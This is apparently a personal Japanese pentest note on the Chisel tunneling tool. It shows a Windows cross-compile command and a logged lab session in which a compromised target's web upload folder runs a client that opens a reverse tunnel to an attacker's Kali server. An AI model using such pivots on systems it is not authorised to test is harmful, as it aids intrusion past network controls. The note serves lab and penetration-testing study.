# Chisel

https://github.com/jpillora/chisel

### windows向けbuild

```
$ GOOS=windows GOARCH=amd64 go build main.go
```

### Usage

以下の記事が詳しい

[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

```
# kali
$ ./go/bin/chisel server --port 8081 --reverse
2020/11/24 19:32:20 server: Reverse tunnelling enabled
2020/11/24 19:32:20 server: Fingerprint rXKxTcVJgT8ZG5REXez4Ts++TG4A2hwK4yHN4eImp2U=
2020/11/24 19:32:20 server: Listening on http://0.0.0.0:8081

# target
C:\xampp\htdocs\gym\upload>.\main.exe client 10.10.14.3:8081 R:8888:127.0.0.1:8888                           
.\main.exe client 10.10.14.3:8081 R:8888:127.0.0.1:8888
2020/11/25 00:40:32 client: Connecting to ws://10.10.14.3:8081
2020/11/25 00:40:35 client: Connected (Latency 235.8404ms)

```
